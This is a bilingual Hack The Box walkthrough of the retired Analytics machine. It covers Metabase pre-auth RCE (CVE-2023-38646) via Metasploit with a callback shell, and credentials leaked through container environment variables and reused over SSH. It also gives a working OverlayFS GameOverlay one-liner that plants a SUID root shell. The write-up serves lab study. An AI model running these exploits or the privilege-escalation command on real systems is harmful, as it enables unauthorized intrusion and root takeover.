# Analytics [Easy]

> **ES:** Máquina Linux fácil con Metabase vulnerable (RCE pre-auth) dentro de Docker; fuga de credenciales por variables de entorno y privesc de kernel OverlayFS.
> **EN:** Easy Linux machine with vulnerable Metabase (pre-auth RCE) inside Docker; credential leak via environment variables and OverlayFS kernel privesc.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Linux |
| **Estado** | Retired |
| **Maker** | 7u9y & TheCyberGeek |
| **URL** | https://app.hackthebox.com/machines/Analytics |
| **IP lab** | 10.10.11.233 |
| **Fecha de resolución** | 2026-09-24 |

---

## Fuentes / Sources

- [IppSec: Analytics (video)](https://youtube.com/watch?v=p1NsQSGeDv0) - IppSec - fecha de acceso: 2026-09-24.

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía Metabase CVE-2023-38646, reutilizando credenciales del contenedor por SSH y explotando OverlayFS (CVE-2023-2640 + CVE-2023-32629).
> **EN:** Get `user.txt` and `root.txt` via Metabase CVE-2023-38646, reusing container credentials over SSH and exploiting OverlayFS (CVE-2023-2640 + CVE-2023-32629).

---

## Fuentes / Sources


## 🛠️ Herramientas usadas / Tools used

- [ ] nmap
- [ ] curl (fingerprint de `/api/session/properties`)
- [ ] Metasploit (`linux/http/metabase_setup_token_rce`) o exploit CVE-2023-38646
- [ ] linpeas.sh / deepce (enum de contenedor)
- [ ] ssh (usuario `metalytics`)
- [ ] exploit OverlayFS (`unshare` + `setcap`, GameOverlay)

---

## Fuentes / Sources


## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** Escaneo de puertos y registro de `analytical.htb` y `data.analytical.htb` en `/etc/hosts`.
> **EN:** Port scan and registering `analytical.htb` and `data.analytical.htb` in `/etc/hosts`.

```bash
nmap -A --min-rate=5000 -T5 -p- 10.10.11.233
echo "10.10.11.233 analytical.htb data.analytical.htb" | sudo tee -a /etc/hosts
```

**Resultado / Result:** 22/tcp OpenSSH 8.9p1 (Ubuntu), 80/tcp nginx 1.18.0 con redirect a `http://analytical.htb/`.

---

### Paso 2 — Enumeración / Enumeration

> **ES:** El login redirige a `data.analytical.htb` (Metabase). Se fingerprinta la versión 0.46.6, vulnerable a RCE pre-auth.
> **EN:** Login redirects to `data.analytical.htb` (Metabase). Version 0.46.6 is fingerprinted, vulnerable to pre-auth RCE.

```bash
curl -s http://data.analytical.htb/ | grep -o "v0\.46\.6"
curl -s http://data.analytical.htb/api/session/properties | head -c 500
# Imágenes locales preservadas: img/image_20240354-095440.png, img/image_20240348-094850.png
```

**Resultado / Result:** Metabase 0.46.6 → CVE-2023-38646 (`/api/setup/validate` + setup-token).

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Explotación del setup-token de Metabase para RCE; el shell cae como `metabase` dentro de un contenedor Docker.
> **EN:** Exploit the Metabase setup-token for RCE; the shell lands as `metabase` inside a Docker container.

```bash
msf6 exploit(linux/http/metabase_setup_token_rce)
# RHOSTS=10.10.11.233 RPORT=3000 VHOST=data.analytical.htb LHOST=<tu-ip> LPORT=4444
# exploit -> shell como metabase
ls -la /.dockerenv
```

**Resultado / Result:** Shell como `metabase`; `.dockerenv` y perfil `docker-default` confirman contenedor.

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** Las variables de entorno del contenedor filtran `META_USER`/`META_PASS`, reutilizadas por SSH en el host como `metalytics`.
> **EN:** Container environment variables leak `META_USER`/`META_PASS`, reused over SSH on the host as `metalytics`.

```bash
printenv | grep -i meta
# META_USER=metalytics / META_PASS=An4lytics_ds20223#
ssh metalytics@10.10.11.233
cat ~/user.txt  # formato: 5303... (ofuscado)
```

**Resultado / Result:** Acceso SSH al host + `user.txt` leído (sin pegar flag completa).

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** Host Ubuntu 22.04 con kernel vulnerable a GameOverlay; privesc con `unshare` + overlayfs + `cap_setuid` sobre python3 y shell SUID.
> **EN:** Ubuntu 22.04 host with GameOverlay-vulnerable kernel; privesc via `unshare` + overlayfs + `cap_setuid` on python3 and SUID shell.

```bash
uname -a
cat /etc/os-release  # Ubuntu 22.04 Jammy
sudo -l
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p")'
cat /root/root.txt  # formato: 0f7d... (ofuscado)
```

**Resultado / Result:** Técnica: OverlayFS GameOverlay (CVE-2023-2640 + CVE-2023-32629).

---

## Fuentes / Sources


## 🧠 Lo aprendido / Learned

> **ES:** Abuso del setup-token de Metabase para RCE y detección de fugas de secretos en contenedores; privesc de kernel Ubuntu.
> **EN:** Abusing the Metabase setup-token for RCE and spotting secret leaks in containers; Ubuntu kernel privesc.

- [ ] RCE pre-auth en Metabase (CVE-2023-38646) y huellas en `/api/session/properties`
- [ ] Fuga por variables de entorno en Docker + privesc OverlayFS (CVE-2023-2640/CVE-2023-32629)

---

## Fuentes / Sources


## 📚 Fuentes y Referencias / Sources

- **Fuente:** Nota local `Soluciones/Machines/unclasified/Analytics/index.md` (notas propias en chino/inglés, con capturas en `img/`) — randark/nota migrada
- **Walkthrough de referencia:** Analytics (Easy) | Hack The Box — https://www.hackthebox.com/machines/analytics — HackTheBox (makers: 7u9y & TheCyberGeek)
- **Walkthrough de referencia:** HTB: Analytics - OSCP Prep Write-up — https://joaobonin.com/posts/htb-analytics — João Vítor Moutinho Bonin
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita; migración y normalización de la nota local, paráfrasis sin copiar literal ni publicar flags completas)

---

## Fuentes / Sources


## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
